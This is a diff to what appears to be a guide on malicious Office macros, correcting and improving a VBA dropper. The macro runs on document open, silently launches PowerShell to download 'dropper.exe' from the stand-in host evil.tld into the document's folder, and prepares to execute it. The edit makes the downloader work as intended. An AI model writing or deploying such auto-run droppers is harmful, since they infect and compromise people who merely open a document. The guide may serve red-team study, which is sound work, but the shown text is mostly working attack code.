@@ -114,17 +114,17 @@ This will allow to execute the macro even if its flagged with MOTW.
 There are different ways to execute a binary.
 
 ```vb
-Sub Docuemnt_Open()
-  Benjugat()
+Sub Document_Open()
+  BenJugat
 End Sub
 
 Sub Autopen()
-  Benjugat()
+  BenJugat
 End Sub
 
 Sub BenJugat()
   Dim str As String
-  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://evil.tld/dropper.exe', 'dropper.exe')"
+  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://evil.tld/dropper.exe', '" + ActiveDocument.Path + "\dropper.exe')"
   Shell str, vbHide
   Dim exePath As String
   exePath = ActiveDocument.Path + "\dropper.exe"
